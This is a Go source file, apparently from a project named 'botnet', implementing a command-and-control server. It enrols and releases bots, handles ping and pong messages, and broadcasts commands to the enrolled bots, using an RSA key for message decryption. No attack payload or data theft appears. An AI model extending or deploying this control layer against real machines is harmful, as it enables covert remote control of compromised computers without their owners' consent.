package ccserver

import (
	"crypto/rsa"
	"log"

	"github.com/adrianosela/botnet/lib/encryption"
	"github.com/adrianosela/botnet/lib/protocol"
)

// CommandAndControl is the command and control - controller
type CommandAndControl struct {
	ServerKey     string
	msgDecryptKey *rsa.PrivateKey
	recvMsgChan   chan *protocol.Message // Channel for receiving de-crypted messages requests
	bots          map[string]*BotCtrl
}

// NewCmdAndCtrl is the constructor for a CommandAndControl
func NewCmdAndCtrl() (*CommandAndControl, error) {
	priv, pub, err := encryption.GenerateRSAKeyPair(8192)
	if err != nil {
		return nil, err
	}
	log.Printf("[master] public key: \n%s", string(pub))
	return &CommandAndControl{
		msgDecryptKey: priv,
		ServerKey:     string(pub),
		recvMsgChan:   make(chan *protocol.Message),
		bots:          make(map[string]*BotCtrl),
	}, nil
}

// StartBotnet begins botnet communication
func (cc *CommandAndControl) StartBotnet() {
	for {
		select {
		case msg := <-cc.recvMsgChan:
			cc.HandleBotMessage(msg)
		}
	}
}

// EnrolBot registers a bot to the botnet
func (cc *CommandAndControl) EnrolBot(bot *BotCtrl) {
	cc.bots[bot.id] = bot
	go bot.writer()
	go bot.reader()
	log.Printf("[%s] joined net", bot.id)
	// let bot know enrolment succeeded
	bot.CommandChan <- &protocol.Command{Type: protocol.CommandTypeWelcome}
	bot.CommandChan <- &protocol.Command{Type: protocol.CommandTypePing}
}

// ReleaseBot de registers a bot from a botnet
func (cc *CommandAndControl) ReleaseBot(id string) {
	if bot, ok := cc.bots[id]; ok {
		delete(cc.bots, id)
		close(bot.CommandChan)
	}
	log.Printf("[%s] left net", id)
}

// HandleBotMessage handles a single given message
func (cc *CommandAndControl) HandleBotMessage(msg *protocol.Message) {
	switch msg.Type {
	case protocol.MessageTypePong:
		log.Printf("[pong] %v", msg)
		return
	default:
		log.Printf("received message of unhandled type: %v", msg)
		return
	}
}

// BroadcastCommand broadcasts a command to all bots
func (cc *CommandAndControl) BroadcastCommand(cmd *protocol.Command) {
	log.Printf("[MASTER] broadcasting message to %d slaves\n", len(cc.bots))
	for botID := range cc.bots {
		cc.SendCommandToBot(cmd, botID)
	}
}

// SendCommandToBot sends a command to only one given bot
func (cc *CommandAndControl) SendCommandToBot(cmd *protocol.Command, id string) {
	select {
	case cc.bots[id].CommandChan <- cmd:
	default:
		cc.ReleaseBot(id)
	}
}
